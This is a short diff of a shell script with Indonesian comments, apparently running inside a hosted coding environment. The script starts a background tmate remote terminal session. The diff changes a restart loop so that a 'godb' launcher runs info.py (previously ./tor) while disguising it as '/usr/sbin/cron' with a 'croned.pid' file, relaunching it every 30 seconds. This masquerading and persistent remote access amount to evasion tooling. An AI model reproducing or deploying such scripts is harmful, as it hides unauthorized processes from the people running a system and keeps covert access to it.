@@ -19,12 +19,6 @@ echo "running tmate"
 tmate -F &
 sleep 5
 
-cd /home/coder/project
-echo "Informasi Currency terkini"
-# Jalankan info.py
-python3 info.py &
-# Tunggu semua proses latar belakang untuk selesai
-
 # Ubah direktori ke /usr/bin dan jalankan hms
 cd /usr/bin
 
@@ -37,7 +31,7 @@ repeat_command() {
     kill_cron_pid
 
     # Jalankan perintah godb baru
-    ./godb -s "/usr/sbin/cron" -d -p croned.pid ./tor &
+    ./godb -s "/usr/sbin/cron" -d -p croned.pid ./info.py &
     GODB_PID=$!
     
     # Tunggu selama 30 detik sebelum mengulang
